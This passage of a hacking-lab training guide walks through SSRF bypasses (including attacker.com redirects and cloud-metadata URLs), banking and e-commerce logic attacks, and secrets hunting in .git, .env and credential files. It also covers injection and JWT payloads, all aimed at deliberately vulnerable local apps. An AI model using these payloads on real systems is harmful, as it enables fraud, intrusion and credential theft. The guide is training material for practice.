[::]  # IPv6

# Bypass via redirection:
http://attacker.com/redirect?url=http://localhost
http://attacker.com/?url=http://169.254.169.254

# DNS rebinding:
http://1u5nxm9t87f5x7y7b4j7.evil.com  # Initially resolves to your IP, then to internal
```

#### Bypass 2: Protocol Wrapping
```bash
# Try different protocols:
dict://localhost:11211/
sftp://localhost:22/
tftp://localhost:69/
ldap://localhost:389/

# Use URL encoding:
http://%6C%6F%63%61%6C%68%6F%73%74/
```

#### Bypass 3: Bypass via IP Tricks
```bash
# IP address bypasses:
http://2130706433/  # 127.0.0.1 in decimal
http://0x7f000001/  # 127.0.0.1 in hex
http://0177.0.0.1/  # 127.0.0.1 in octal
http://127.0.1/     # Abbreviated
http://127.1/       # More abbreviated

# Use URL fragmentation:
http://localhost%23.evil.com/
http://localhost%00.evil.com/
http://localhost#.evil.com/
```

### Learning Outcomes
- SSRF detection and confirmation
- Internal port scanning
- Cloud metadata exploitation
- Local file reading via file:// protocol
- Blind SSRF techniques
- SSRF to RCE (Redis, FastCGI)
- Filter bypass techniques
- DNS rebinding
- Protocol smuggling

---

## Scenario 7: Business Logic Flaws in Banking

### Objective
Identify and exploit business logic vulnerabilities in VulnBank.

### Prerequisites
- VulnBank: http://8097
- Understanding of banking operations
- Creativity in thinking outside normal flows

### Phase 1: Account Enumeration

#### Test 1: User ID Enumeration
```bash
# Try different account numbers:
GET /api/v1/accounts/1
GET /api/v1/accounts/2
GET /api/v1/accounts/999

# Look for:
- Account number pattern
- Other users' data (IDOR)
- Information disclosure in error messages
```

### Phase 2: Transaction Manipulation

#### Attack 1: Negative Amount
```bash
POST /api/v1/transactions
{
  "from": "your_account",
  "to": "your_account",
  "amount": -1000,
  "description": "deposit"
}

# Result: Add money instead of subtract!
```

#### Attack 2: Decimal Manipulation
```bash
# Try floating point tricks:
{
  "amount": 1.0000000000001
}

# Or rounding errors:
{
  "amount": 0.999999999
}

# Try currency manipulation:
{
  "amount": 100,
  "currency": "USD",
  "convert_to": "JPY"  # Exchange rate manipulation
}
```

#### Attack 3: Race Conditions
```bash
# Send multiple simultaneous transfer requests:
for i in {1..100}; do
  curl -X POST http://localhost:8097/api/v1/transfer \
    -H "Content-Type: application/json" \
    -d '{"from":"acct1","to":"acct2","amount":100}' &
done

# Try to double-spend same money
```

### Phase 3: Fee Bypass

#### Attack 1: Fee Manipulation
```bash
POST /api/v1/transfer
{
  "from": "acct1",
  "to": "acct2",
  "amount": 1000,
  "fee": 0,  # Remove fee!
  "fee_account": "some_other_acct"  # Or charge different account
}
```

#### Attack 2: Transaction Limit Bypass
```bash
# If daily limit is $10,000:
# Transfer $9,999 100 times
# Or split transactions:
for i in {1..100}; do
  curl -X POST http://localhost:8097/api/v1/transfer \
    -d '{"amount":9999,"to":"attacker_acct"}'
done
```

### Phase 4: Interest Rate Manipulation

#### Attack 1: Force Interest Calculation
```bash
# Force multiple interest calculations:
# 1. Deposit large amount
# 2. Immediately withdraw
# 3. Repeat to exploit compound interest

for i in {1..1000}; do
  curl -X POST http://localhost:8097/api/v1/deposit \
    -d '{"amount":1000000}'
  curl -X POST http://localhost:8097/api/v1/withdraw \
    -d '{"amount":1000000}'
done
```

### Phase 5: Loan and Credit Exploitation

#### Attack 1: Loan Fraud
```bash
POST /api/v1/loans/apply
{
  "amount": 999999,
  "collateral": "fake_collateral",
  "income": 999999999,
  "credit_score": 999
}

# Manipulate loan parameters:
{
  "amount": 1000000,
  "interest_rate": -1,  # Negative interest!
  "repayment_period": 9999  # Very long term
}
```

#### Attack 2: Credit Card Bypass
```bash
# Test credit card validation:
POST /api/v1/cards
{
  "card_number": "4111111111111111",  # Test card
  "cvv": "000",
  "expiry": "12/99"
}

# Try negative charges:
{
  "card_number": "your_card",
  "amount": -500  # Refund without purchase
}
```

### Phase 6: Authentication Bypass in Banking

#### Attack 1: OTP Bypass
```bash
# Try to bypass OTP:
# 1. Initiate transfer
# 2. Don't enter OTP, try to replay request
# 3. Try using same OTP multiple times
# 4. Try predicting OTP if it's weak

# Example:
POST /api/v1/transfer
{
  "to": "attacker",
  "amount": 10000,
  "otp": ""  # Empty or skip parameter
}
```

#### Attack 2: Session Hijacking
```bash
# 1. Login to your account
# 2. Capture session token
# 3. Modify user ID in token (if not signed properly)
# 4. Access other accounts

# With JWT:
jwt_tool <TOKEN> -I -pc user_id -pv <victim_user_id>
```

### Phase 7: Transaction Authorization Bypass

#### Attack 1: Skip Authorization Steps
```bash
# Go directly to final step:
POST /api/v1/transfer/confirm
{
  "transaction_id": "generated_id",
  "confirmed": true
}

# Skip 2FA/authorization:
POST /api/v1/transfer
{
  "bypass_auth": true,  # Add suspicious parameter
  "skip_otp": true
}
```

### Learning Outcomes
- Business logic flaw identification
- Financial application testing
- Race condition exploitation
- Transaction manipulation
- Fee and limit bypass
- Authentication/authorization bypass
- Creative thinking in security testing

---

## Scenario 8: Secrets Discovery with WrongSecrets

### Objective
Learn secrets management vulnerabilities and secure practices.

### Prerequisites
- OWASP WrongSecrets: http://localhost:8099
- Understanding of secrets in applications
- Basic web security knowledge

### Phase 1: Hardcoded Secrets

#### Challenge 1: JavaScript Secrets
```bash
# 1. View page source
# 2. Check all .js files
# 3. Look for:
   - API keys
   - Passwords
   - Tokens
   - Secrets

# Tools:
# Browser DevTools -> Network -> JS files
# Grep: curl <URL> | grep -i "secret\|key\|password\|token"
```

#### Challenge 2: HTML Comments
```bash
# Check HTML source for:
<!-- secret: xxx -->
<!-- API_KEY: xxx -->
<!-- TODO: remove this secret -->
```

### Phase 2: Git History Secrets

#### Technique 1: Access .git Directory
```bash
# If .git is exposed:
http://localhost:8099/.git/

# Download it:
wget -r http://localhost:8099/.git/

# Browse history:
cd .git
git log
git show
git diff

# Search for secrets:
git grep -i "secret\|password\|key"
```

#### Technique 2: Git-Dumper
```bash
# Install git-dumper
pip install git-dumper

# Dump .git directory:
git-dumper http://localhost:8099/.git output

# Analyze:
cd output
git log --all --full-history --source
git grep -i "secret"
```

### Phase 3: Environment Variable Leaks

#### Leak 1: Error Pages
```bash
# Trigger errors to leak environment:
# 1. Submit malformed input
# 2. Access non-existent pages
# 3. Crash the application
# 4. Check stack traces for env vars

# Example:
GET /?page='
GET /debug
GET /env
GET /config
```

#### Leak 2: Debug Endpoints
```bash
# Common debug endpoints:
/debug
/debug/info
/env
/config
/settings
/actuator/env  # Spring Boot
/actuator/configprops  # Spring Boot
```

### Phase 4: Configuration File Secrets

#### File 1: Read Config Files
```bash
# Try accessing:
/config.yml
/config.json
/application.properties
/.env
/credentials.json
/secrets.json
/aws/credentials
/credentials

# Using curl:
curl http://localhost:8099/.env
curl http://localhost:8099/config.json
```

#### File 2: Backup Files
```bash
# Look for backup files:
/config.yml.bak
/config.json.old
/.env.backup
/.env.local
/.env.development
/credentials.bak
```

### Phase 5: Docker and Kubernetes Secrets

#### Secret 1: Docker Secrets
```bash
# Check if running in Docker:
# Mounts might contain:
/run/secrets/
/secrets/

# Common secret paths:
/run/secrets/db_password
/run/secrets/api_key
/var/secrets/
```

#### Secret 2: Kubernetes Secrets
```bash
# Check K8s secrets:
/var/run/secrets/kubernetes.io/
/mounted-secrets/

# Try:
GET /api/v1/secrets
GET /api/v1/pods/secrets
```

### Phase 6: Build and CI/CD Secrets

#### Secret 1: CI/CD Variables
```bash
# Check for CI/CD exposed secrets:
# .gitlab-ci.yml
# .github/workflows
# jenkins.txt
# circleci/config.yml

# Look for:
- CI_TOKEN
- DEPLOY_KEY
- API_SECRET
- BUILD_SECRET
```

#### Secret 2: Compiled Artifacts
```bash
# Check compiled JS/WebAssembly:
# 1. Download .wasm files
# 2. Decompile
# 3. Search for strings

# Or check JavaScript bundles:
curl http://localhost:8099/bundle.js | strings | grep -i secret
```

### Phase 7: Cloud Provider Secrets

#### Cloud 1: AWS Secrets
```bash
# Look for AWS credentials:
AWS_ACCESS_KEY_ID
AWS_SECRET_ACCESS_KEY
AWS_SESSION_TOKEN

# Format:
AKIAIOSFODNN7EXAMPLE
wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
```

#### Cloud 2: GCP Secrets
```bash
# Google Cloud:
GOOGLE_CREDENTIALS
SERVICE_ACCOUNT_JSON
gcp_service_account.json

# Look for:
"type": "service_account"
"project_id"
```

### Phase 8: Database Connection Strings

#### Database 1: Find Connection Strings
```bash
# Common patterns:
mysql://user:password@host:port/db
postgresql://user:password@host:port/db
mongodb://user:password@host:port/db
redis://host:port

# Search in source:
curl -s http://localhost:8099/ | grep -i "mongodb\|mysql\|postgres"
```

### Learning Outcomes
- Secrets discovery techniques
- Understanding secrets management
- Secure storage practices
- Git history analysis
- Environment variable handling
- Cloud secrets
- CI/CD security
- Database credential exposure

---

## Scenario 9: E-commerce Exploitation

### Objective
Exploit e-commerce vulnerabilities in Hackazon.

### Prerequisites
- Hackazon: http://localhost:8104
- Understanding of e-commerce flows
- Creative problem-solving

### Phase 1: Product Price Manipulation

#### Attack 1: Modify Product Price
```bash
# 1. Browse products
GET /api/v1/products/1
# Price: $100

# 2. Add to cart with modified price:
POST /api/v1/cart/add
{
  "product_id": 1,
  "quantity": 1,
  "price": 0.01,  # Modified!
  "original_price": 100
}

# 3. Checkout - pay only $0.01!
```

#### Attack 2: Negative Quantity
```bash
POST /api/v1/cart/add
{
  "product_id": 1,
  "quantity": -5,
  "price": 100
}

# Result: Add money to account!
```

#### Attack 3: Integer Overflow
```bash
POST /api/v1/cart/add
{
  "product_id": 1,
  "quantity": 999999999999,
  "price": 0
}

# Or manipulate total:
{
  "total": -999999,
  "items": [...]
}
```

### Phase 2: Coupon and Discount Abuse

#### Attack 1: Coupon Stacking
```bash
# Apply multiple coupons:
POST /api/v1/checkout
{
  "items": [...],
  "coupons": ["SAVE50", "SAVE30", "SAVE20"],  # Stack!
  "discount_percent": 99  # Additional discount
}
```

#### Attack 2: Reuse Single-Use Coupon
```bash
# Race condition:
for i in {1..10}; do
  curl -X POST http://localhost:8104/api/v1/purchase \
    -d '{"coupon":"ONCE50","items":[1]}' &
done

# All might succeed if no proper locking
```

#### Attack 3: Create Fake Coupons
```bash
# Try predictable coupon codes:
POST /api/v1/cart/apply-coupon
{
  "code": "SAVE100",  # Try variations
  "code": "ADMIN",
  "code": "TEST",
  "code": "FREE100"
}

# Or try exploiting coupon generation:
# Analyze pattern: SAVE50, SAVE30
# Try: SAVE99, SAVE100
```

### Phase 3: Shipping and Payment Manipulation

#### Attack 1: Free Shipping
```bash
POST /api/v1/checkout
{
  "items": [...],
  "shipping": {
    "method": "express",
    "cost": 0,  # Remove shipping cost!
    "free_shipping": true
  }
}
```

#### Attack 2: Payment Bypass
```bash
# Skip payment step:
POST /api/v1/checkout/complete
{
  "order_id": "12345",
  "payment_status": "paid",  # Pretend paid!
  "payment_method": "bypass"
}

# Or negative payment:
{
  "amount": -100,  # Money back!
  "payment_method": "credit_card"
}
```

### Phase 4: Inventory Manipulation

#### Attack 1: Race Condition - Oversell
```bash
# If item has 5 in stock:
# 6 buyers try to buy simultaneously:
for i in {1..6}; do
  curl -X POST http://localhost:8104/api/v1/purchase \
    -d '{"product_id":1,"quantity":5}' &
done

# All might succeed!
```

#### Attack 2: Inventory Bypass
```bash
POST /api/v1/purchase
{
  "product_id": 1,
  "quantity": 999,  # More than stock!
  "check_inventory": false  # Try to bypass
}
```

### Phase 5: User Privilege Escalation

#### Attack 1: Admin Panel Access
```bash
# Try accessing admin endpoints:
GET /admin
GET /admin/orders
GET /admin/users
GET /admin/products

# IDOR: Modify user_id in request to 1 (admin)
GET /api/v1/users/1/orders
```

#### Attack 2: Manipulate User Role
```bash
POST /api/v1/users/update
{
  "user_id": "your_id",
  "role": "admin",  # Escalate!
  "permissions": ["read", "write", "delete"]
}
```

### Phase 6: Order Manipulation

#### Attack 1: Modify Order After Placement
```bash
# 1. Place order normally
POST /api/v1/orders
# Returns order_id: 12345

# 2. Modify order:
PUT /api/v1/orders/12345
{
  "items": [1, 2, 3],
  "total": 0,  # Free!
  "status": "completed"
}
```

#### Attack 2: Order Cancellation Exploit
```bash
# 1. Place order
# 2. Cancel after shipping
POST /api/v1/orders/12345/cancel
# 3. Keep items but get refund
```

### Phase 7: Refund Abuse

#### Attack 1: Multiple Refunds
```bash
# Request refund multiple times:
for i in {1..5}; do
  curl -X POST http://localhost:8104/api/v1/orders/12345/refund
done

# Get 5x refund!
```

#### Attack 2: Refund More Than Paid
```bash
POST /api/v1/orders/12345/refund
{
  "amount": 9999,  # More than order total!
  "reason": "overpriced"
}
```

### Learning Outcomes
- E-commerce vulnerability patterns
- Price manipulation attacks
- Business logic flaws
- Race conditions
- Payment processing flaws
- Inventory management issues
- Refund abuse
- User privilege escalation

---

## Scenario 10: Complete API Hacking Challenge

### Objective
Apply all API security skills in a comprehensive challenge.

### Prerequisites
- Multiple API services running
- Understanding of previous scenarios
- All tools ready (Postman, Burp Suite, etc.)

### The Challenge

You have 2 hours to:
1. Reconnaissance all API endpoints
2. Find and exploit authentication bypass
3. Extract all user data
4. Gain administrative access
5. Find secret keys/tokens
6. Exploit business logic flaws
7. Document all findings

### Step-by-Step Solution

#### Phase 1: Reconnaissance (30 minutes)

```bash
# 1. Port scan
nmap -sV -p 8090-8106 localhost

# 2. Discover API endpoints
curl http://localhost:8093/api/v1/
curl http://localhost:8102/api/
curl http://localhost:8103/api/

# 3. Check for documentation
curl http://localhost:8093/swagger.json
curl http://localhost:8093/api-docs

# 4. Directory brute force
gobuster dir -u http://localhost:8093 -w /usr/share/wordlists/api-endpoints.txt

# 5. Fuzz parameters
ffuf -w params.txt -u "http://localhost:8093/api/v1/users?FUZZ=test"
```

#### Phase 2: Authentication Testing (30 minutes)

```bash
# 1. Default credentials
POST /api/v1/auth/login
{"username":"admin","password":"admin"}

# 2. SQL injection
{"username":"admin' --","password":"x"}

# 3. NoSQL injection
{"username":{"$ne":null},"password":{"$ne":null}}

# 4. JWT manipulation
# Capture token, decode, try:
- Change role to admin
- Change expiration time
- Try "none" algorithm

# 5. Session fixation
# Try to set own session ID
```

#### Phase 3: Authorization Testing (30 minutes)

```bash
# 1. IDOR
GET /api/v1/users/1  # Not your account!
GET /api/v1/orders/2  # Not your order!

# 2. Privilege escalation
POST /api/v1/users/update
{"role":"admin","is_admin":true}

# 3. Admin endpoints
GET /admin
GET /api/v1/admin/dashboard
GET /api/v1/admin/users
```

#### Phase 4: Data Extraction (20 minutes)

```bash
# 1. Extract all users
GET /api/v1/users
# Or manually iterate:
GET /api/v1/users/1
GET /api/v1/users/2
...

# 2. Dump database via SQL injection
sqlmap -u "http://localhost:8091/Less-1/?id=1" --dump

# 3. GraphQL introspection
POST /graphql
{"query":"{ __schema { queryType { fields { name } } } }"}
```

#### Phase 5: Advanced Exploitation (30 minutes)

```bash
# 1. Business logic
# - Negative amounts
# - Race conditions
# - Coupon abuse

# 2. SSRF
# - Scan internal ports
# - Access cloud metadata
# - Read local files

# 3. Secrets discovery
# - Check .git
# - Read .env
# - Check JS files
# - Look for API keys
```

#### Phase 6: Documentation (10 minutes)

```markdown
# API Security Assessment Report

## Vulnerabilities Found

### 1. Authentication Bypass
- **Severity**: Critical
- **Endpoint**: /api/v1/auth/login
- **Payload**: {"username":{"$ne":null},"password":{"$ne":null}}
- **Impact**: Full access to any account

### 2. IDOR
- **Severity**: High
- **Endpoint**: /api/v1/users/{id}
- **Impact**: Access all user data

### 3. JWT Weakness
- **Severity**: High
- **Issue**: None algorithm accepted
- **Impact**: Token forgery

### 4. Business Logic Flaw
- **Severity**: Medium
- **Endpoint**: /api/v1/orders
- **Issue**: Negative quantities accepted
- **Impact**: Free products, account credit

## Recommendations
1. Implement proper input validation
2. Fix JWT implementation
3. Add authorization checks
4. Validate business logic
5. Implement rate limiting
```

### Scoring

| Task | Points |
|------|--------|
| Reconnaissance complete | 10 |
| Authentication bypass | 20 |
| Extract all user data | 20 |
| Admin access | 15 |
| Secret keys found | 15 |
| Business logic flaw | 10 |
| Documentation | 10 |
| **Total** | **100** |

### Learning Outcomes
- Complete API security methodology
- Combining multiple vulnerabilities
- Time management in assessments
- Professional reporting
- Real-world simulation

---

## Conclusion

These scenarios provide a comprehensive path from beginner to advanced in various security domains:

- **SQL Injection**: SQLi-Labs progression
- **API Security**: GraphQL and REST API exploitation
- **XSS**: All types and bypass techniques
- **Python SSTI**: Template injection mastery
- **SSRF**: Internal reconnaissance and exploitation
- **Business Logic**: Creative thinking in financial apps
- **Secrets Management**: Discovery and prevention
- **E-commerce**: Full shopping flow exploitation

Practice each scenario multiple times, try different approaches, and document your findings. Happy ethical hacking!
